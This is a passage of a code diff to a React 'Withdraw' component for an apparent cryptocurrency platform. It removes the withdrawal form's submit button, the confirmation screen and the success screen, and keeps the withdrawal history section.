-              </div>
-            </div>
-
-            <button
-              type="submit"
-              disabled={
-                !amount || 
-                parseFloat(amount) > availableBalance || 
-                parseFloat(amount) < 10 ||
-                !walletAddress ||
-                !validateWalletAddress(walletAddress, selectedNetwork)
-              }
-              className={`w-full py-3 rounded-lg font-bold ${
-                !amount || 
-                parseFloat(amount) > availableBalance || 
-                parseFloat(amount) < 10 ||
-                !walletAddress ||
-                !validateWalletAddress(walletAddress, selectedNetwork)
-                  ? 'bg-gray-700 cursor-not-allowed'
-                  : 'bg-gold text-black hover:bg-yellow-600'
-              } transition`}
-            >
-              Continue
-            </button>
-          </form>
-        </div>
-      )}
-
-      {/* Step 2: Confirmation */}
-      {step === 2 && (
-        <div className="glassmorphic p-6 rounded-xl max-w-lg mx-auto">
-          <div className="mb-8">
-            <h3 className="text-xl font-bold mb-6">Confirm Your Withdrawal</h3>
-            <div className="space-y-4 mb-6">
-              <div className="flex justify-between">
-                <span className="text-gray-400">Amount (USD)</span>
-                <span className="font-medium">${amount} USD</span>
-              </div>
-              <div className="flex justify-between">
-                <span className="text-gray-400">Conversion Rate</span>
-                <span className="font-medium">
-                  1 {currency} = ${liveRate ? parseFloat(liveRate).toLocaleString(undefined, { maximumFractionDigits: 2 }) : '--'} USD
-                </span>
-              </div>
-              <div className="flex justify-between">
-                <span className="text-gray-400">Network</span>
-                <span className="font-medium">
-                  {networks.find(n => n.id === selectedNetwork)?.name}
-                </span>
-              </div>
-              <div className="flex justify-between">
-                <span className="text-gray-400">Destination Address</span>
-                <span className="font-mono text-sm break-all text-right">
-                  {walletAddress}
-                </span>
-              </div>
-              <div className="flex justify-between border-t border-gray-800 pt-4">
-                <span className="text-gray-400">You Will Receive</span>
-                <span className="font-medium">{liveCryptoAmount} {currency}</span>
-              </div>
-            </div>
-
-            <div className="bg-gray-800 bg-opacity-50 p-4 rounded-lg mb-6">
-              <div className="flex items-start">
-                <FiInfo className="text-gold mt-1 mr-3 flex-shrink-0" />
-                <p className="text-sm text-gray-300">
-                  Please verify the destination address carefully. Withdrawals cannot be reversed.
-                </p>
-              </div>
-            </div>
-          </div>
-
-          <div className="flex space-x-4">
-            <button
-              onClick={() => setStep(1)}
-              className="flex-1 py-3 rounded-lg font-bold border border-gray-600 hover:bg-gray-800 transition"
-            >
-              Back
-            </button>
-            <button
-              onClick={handleConfirmWithdrawal}
-              disabled={isSubmitting}
-              className={`flex-1 py-3 rounded-lg font-bold bg-gold text-black hover:bg-yellow-600 transition ${
-                isSubmitting ? 'opacity-75' : ''
-              }`}
-            >
-              {isSubmitting ? 'Processing...' : 'Confirm Withdrawal'}
-            </button>
-          </div>
-        </div>
-      )}
-
-      {/* Step 3: Success */}
-      {step === 3 && (
-        <div className="glassmorphic p-6 rounded-xl text-center">
-          <div className="flex justify-center mb-6">
-            <div className="bg-green-500 bg-opacity-20 p-4 rounded-full text-green-500">
-              <FiCheck size={40} />
-            </div>
-          </div>
-          
-          <h3 className="text-2xl font-bold mb-4">Withdrawal Submitted!</h3>
-          <p className="text-gray-400 mb-6">
-            Your withdrawal request for {liveCryptoAmount} {currency} (≈ ${amount} USD) has been received.<br/>
-            You will be notified once your withdrawal is processed.
-          </p>
-          <div className="glassmorphic p-4 rounded-lg mb-8">
-            <p className="text-sm text-gray-400 mb-1">Transaction ID</p>
-            <p className="font-mono text-gold">{transactionId}</p>
-            <button
-              onClick={() => copyToClipboard(transactionId)}
-              className="text-xs text-gray-400 hover:text-gold mt-2 flex items-center justify-center mx-auto"
-            >
-              <FiCopy className="mr-1" /> Copy
-            </button>
-          </div>
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-            <button
-              onClick={() => navigate('/portfolio')}
-              className="py-3 rounded-lg font-bold border border-gray-600 hover:bg-gray-800 transition"
-            >
-              View Portfolio
-            </button>
-            <button
-              onClick={handleNewWithdrawal}
-              className="py-3 rounded-lg font-bold bg-gold text-black hover:bg-yellow-600 transition"
-            >
-              New Withdrawal
-            </button>
-          </div>
-        </div>
-      )}
       <div className="mt-12">
         <h2 className="text-xl font-bold mb-4">Withdrawal History</h2>
         <WithdrawalHistory withdrawals={withdrawals} />
       </div>
     </div>
   );
-}
+};
 
 export default Withdraw;
